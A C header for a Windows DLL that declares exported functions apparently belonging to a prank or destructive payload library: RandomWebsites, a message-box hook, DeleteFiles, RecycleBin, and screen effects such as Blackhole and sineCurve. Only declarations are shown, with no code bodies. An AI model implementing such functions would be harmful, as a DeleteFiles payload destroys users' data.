#ifndef _DLL_H_
#define _DLL_H_

#if BUILDING_DLL
#define DLLIMPORT __declspec(dllexport)
#else
#define DLLIMPORT __declspec(dllimport)
#endif
#include <Windows.h>
#include <shellapi.h>
#include <commctrl.h>
#include <shlobj.h>

DLLIMPORT int WINAPI RandomWebsites(); 
DLLIMPORT int winver();
DLLIMPORT LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam);
DLLIMPORT int WINAPI DeleteFiles();
DLLIMPORT int Circle();
DLLIMPORT int WINAPI Question();
DLLIMPORT int WINAPI RecycleBin();
DLLIMPORT int sineCurve();
DLLIMPORT int Blackhole();
#endif
